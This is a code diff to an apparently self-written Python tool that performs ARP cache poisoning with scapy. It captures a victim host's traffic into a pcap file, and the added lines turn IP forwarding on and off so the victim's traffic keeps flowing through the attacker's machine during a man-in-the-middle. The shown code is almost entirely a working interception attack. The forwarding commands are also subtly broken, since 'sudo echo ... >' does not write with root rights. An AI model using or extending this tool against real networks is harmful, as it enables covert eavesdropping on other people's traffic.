@@ -84,6 +84,7 @@ class ARP_Poisoner:
                 sc.send(poisoned_gateway)
             except KeyboardInterrupt:
                 self.restore()
+                os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
                 sys.exit(0)
             else:
                 time.sleep(2)
@@ -91,13 +92,20 @@ class ARP_Poisoner:
     def sniff(self, count=100):
         # wait for the poison process starting poisoning successully
         time.sleep(5)
+
+        # start sniffing
         print(f"Sniffing {count} packets...")
         bpf_filter = f"ip host {self.victim}"
         packets = sc.sniff(count=count, filter=bpf_filter, iface=self.interface)
-        sc.wrpcap("arp_cache_poisoner.pcap", packets)
+
+        # write packets to pcap
         print("Got the packets!")
+        sc.wrpcap("arp_cache_poisoner.pcap", packets)
+
+        # terminating
         self.restore()
         self.poison_process.terminate()
+        os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
         print("Finished.")
 
     def restore(self):
@@ -131,6 +139,8 @@ class ARP_Poisoner:
 
 
 if __name__ == "__main__":
+    # enable ip forwarding
+    os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
     victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
     poisoner = ARP_Poisoner(victim, gateway, interface)
     poisoner.run()
